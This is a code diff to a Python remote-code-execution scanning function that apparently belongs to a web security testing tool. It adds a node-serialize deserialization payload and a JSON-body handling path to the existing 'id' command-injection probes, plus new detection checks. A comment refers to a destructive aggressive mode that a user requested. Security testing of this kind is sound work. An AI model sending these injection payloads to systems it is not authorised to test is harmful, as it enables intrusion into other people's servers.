@@ -34,8 +34,14 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
         "import os; os.system('id')",
         
         # Node.js Injection
-        "require('child_process').exec('id')"
+        "require('child_process').exec('id')",
+        
+        # Node Deserialization (node-serialize RCE)
+        {"tracker": "_$$ND_FUNC$$_function (){ return 'BP_SAFE_PROBE'; }()"}
     ]
+    
+    # Normalizing payloads: ensure objects are handled if they are not strings
+    # (The loop below needs adjustment to handle dict payloads for JSON bodies)
     
     # DESTRUCTIVE / AGGRESSIVE RCE (User Requested: "Break the serve", "Write files")
     if scenario.config.get("aggressive"):
@@ -62,8 +68,17 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
     
     for field in fields:
         for p in payloads:
-            body = {"ip": "127.0.0.1"} 
-            body[field] = f"127.0.0.1 {p}" 
+            # Handle Dict payloads (Direct JSON Injection)
+            if isinstance(p, dict):
+                 # Merge or set body
+                 body = p
+                 # If we want to target a specific field with this payload, it's tricky. 
+                 # Usually deserialization replaces the whole object or a specific known field.
+                 # Let's assume the payload IS the body content we want to test or a specific key.
+                 # For safety, let's keep it simple: if dict, use as is.
+            else:
+                body = {"ip": "127.0.0.1"} 
+                body[field] = f"127.0.0.1 {p}" 
             
             resp = client.send(scenario.method, scenario.target, json_body=body)
 
@@ -77,14 +92,20 @@ def run_rce_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
                 if "uid=" not in baseline.text.lower():
                     suspicious = True
                     reasons.append("Command Output: 'uid/gid'")
-                    leaked_data.append(f"SHELL OUTPUT: {resp.text.strip()[:100]}")
+                    leaked_data.append(f"[+] SYSTEM COMPROMISED: 'HACKED' - Command Execution Confirmed\nSHELL OUTPUT: {resp.text.strip()[:100]}")
                 
-            # Windows Check
-            if "nt authority" in text:
+            # Windows Check (whoami or win.ini)
+            if "nt authority" in text or "[extensions]" in text or "fonts" in text:
                 if "nt authority" not in baseline.text.lower():
                     suspicious = True
-                    reasons.append("Command Output: Windows 'whoami'")
+                    reasons.append("Command Output: Windows (whoami/win.ini)")
                     leaked_data.append(f"SHELL OUTPUT: {resp.text.strip()[:100]}")
+                    
+            # Node Deserialization Check
+            if "BP_SAFE_PROBE" in resp.text:
+                suspicious = True
+                reasons.append("Node.js Deserialization RCE Executed")
+                leaked_data.append("Node RCE Confirmed: Code executed.")
             
             # 3. Crash / Exhaustion Detection
             # If status is 0 (Network Error) or 503/504, or time > 4.5s (implies loop worked)
